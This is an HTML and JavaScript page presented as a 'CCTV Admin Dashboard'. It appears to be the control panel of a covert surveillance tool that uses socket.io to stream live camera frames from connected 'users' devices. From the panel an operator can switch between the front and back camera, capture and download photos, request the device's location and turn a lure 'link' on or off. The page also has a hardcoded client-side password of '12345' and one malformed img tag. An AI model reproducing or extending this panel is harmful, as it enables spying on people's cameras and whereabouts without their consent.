<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<title>CCTV Admin Dashboard</title>
<style>
body { font-family: Arial, sans-serif; background: #121212; color: #fff; margin: 0; padding: 20px; }
#login { position: fixed; top:0; left:0; width:100%; height:100%; background:#0a0a0a; display:flex; flex-direction:column; align-items:center; justify-content:center; z-index:100; }
input, button { padding: 10px; margin: 5px; font-size: 14px; border-radius: 5px; border: none; }
button { background: #00e676; font-weight: bold; cursor: pointer; }
.top-bar { background: #1e1e1e; padding: 15px; border-radius: 8px; display: flex; justify-content: space-between; align-items: center; margin-bottom: 20px; border: 1px solid #333; }
.grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(320px, 1fr)); gap: 20px; }
.card { background: #1a1a1a; border: 1px solid #444; border-radius: 8px; overflow: hidden; display: flex; flex-direction: column; }
.head { background: #252525; padding: 10px; font-size: 12px; display: flex; justify-content: space-between; align-items: center; border-bottom: 1px solid #333; }
.body img { width: 100%; height: 200px; object-fit: cover; background: #000; display: block; }
.controls-panel { padding: 10px; background: #181818; display: flex; flex-direction: column; gap: 8px; border-top: 1px solid #333; }
.row { display: flex; gap: 6px; }
.row button { flex: 1; font-size: 12px; padding: 8px; }
.btn-cap { background: #ff1744; color: #fff; }
.btn-sw { background: #ff9800; color: #fff; }
.btn-loc { background: #2196f3; color: #fff; }
.btn-link { background: #9c27b0; color: #fff; }
.gallery { display: grid; grid-template-columns: repeat(auto-fill, minmax(140px, 1fr)); gap: 10px; margin-top: 15px; }
.p-card { background: #222; padding: 6px; border-radius: 5px; text-align: center; }
.p-card img { width: 100%; border-radius: 4px; }
.btn-dl { background: #0288d1; color:#fff; display:block; padding:4px; margin-top:4px; text-decoration:none; font-size:11px; border-radius:3px; }
.btn-del { background: #d32f2f; color:#fff; width:100%; padding:4px; margin-top:4px; font-size:11px; border-radius:3px; cursor:pointer; }
</style>
</head>
<body>
<div id="login">
<h2>?? Admin Login</h2>
<input type="password" id="p" placeholder="Password (12345)">
<button onclick="login()">Login</button>
</div>

<div class="top-bar">
<div>
<h2>?? CCTV Dashboard</h2>
<span id="cnt">Active Users: 0</span>
</div>
<div>
<button class="btn-link" id="linkBtn" onclick="toggleLink()">?? Turn Link OFF</button>
</div>
</div>

<div class="grid" id="grid"></div>

<h3 style="margin-top:30px;">?? Captured Photos Gallery</h3>
<div class="gallery" id="gallery"></div>

<script src="/socket.io/socket.io.js"></script>
<script>
const socket = io();
let isLinkActive = true;

function login() {
if(document.getElementById('p').value === '12345') {
document.getElementById('login').style.display = 'none';
socket.emit('admin-auth-success');
} else alert('Wrong Password');
}

function toggleLink() {
isLinkActive = !isLinkActive;
socket.emit('admin-toggle-link', isLinkActive);
const btn = document.getElementById('linkBtn');
if(isLinkActive) {
btn.innerText = '?? Turn Link OFF';
btn.style.background = '#9c27b0';
} else {
btn.innerText = '?? Turn Link ON';
btn.style.background = '#00e676';
}
}

function capture(id) { socket.emit('admin-trigger-capture', id); }
function requestLoc(id) { socket.emit('admin-request-location', id); }
function switchCam(id, facing) { socket.emit('admin-switch-camera', { targetId: id, facing: facing }); }
function deletePhoto(fn, elId) { socket.emit('delete-photo', fn); document.getElementById(elId).remove(); }

socket.on('update-users-list', (users) => {
const keys = Object.keys(users);
document.getElementById('cnt').innerText = 'Active Users: ' + keys.length;
const grid = document.getElementById('grid');
grid.innerHTML = '';
keys.forEach((id, idx) => {
const u = users[id];
const dev = u.deviceInfo || 'Device';
let locDisplay = '<button class="btn-loc" onclick="requestLoc(\\'' + id + '\\')">?? Track Location</button>';
if(u.location) {
locDisplay = '<a href="https://maps.google.com/?q=' + u.location.lat + ',' + u.location.lon + '" target="_blank" style="color:#00e676; font-weight:bold; text-decoration:none; background:#222; padding:4px 8px; border-radius:4px; display:inline-block;">??? Open Map</a>';
}

grid.innerHTML += '<div class="card" id="c_' + id + '"><div class="head"><span>CAM ' + (idx+1) + ': ' + dev + '</span><span>' + locDisplay + '</span></div><div class="body"><img id="img_' + id + ' src=`"></div><div class="controls-panel"><div class="row"><button class="btn-sw" onclick="switchCam(\\'' + id + '\\', 'user')">?? Front Cam</button><button class="btn-sw" onclick="switchCam(\\'' + id + '\\', 'environment')">?? Back Cam</button></div><div class="row"><button class="btn-cap" onclick="capture(\\'' + id + '\\')">?? Capture Photo</button></div></div></div>';
});
});

socket.on('update-live-stream', (d) => {
const img = document.getElementById('img_' + d.socketId);
if(img) img.src = d.frameData;
});

function addPhotoToGallery(imgData, fn) {
const gallery = document.getElementById('gallery');
const elId = 'p_' + fn.replace(/[^a-zA-Z0-9]/g, '');
if(document.getElementById(elId)) return;
gallery.innerHTML += '<div class="p-card" id="' + elId + '"><img src="' + imgData + '"><a class="btn-dl" href="' + imgData + '" download="' + fn + '">?? Download</a><button class="btn-del" onclick="deletePhoto(\\'' + fn + '\\', \\'' + elId + '\\')">??? Delete</button></div>';
}

socket.on('load-stored-photos', (photos) => {
photos.forEach(p => addPhotoToGallery(p.imageData, p.fileName));
});

socket.on('send-photo-to-admin', (p) => {
addPhotoToGallery(p.imageData, p.fileName);
});
</script>
</body>
</html>
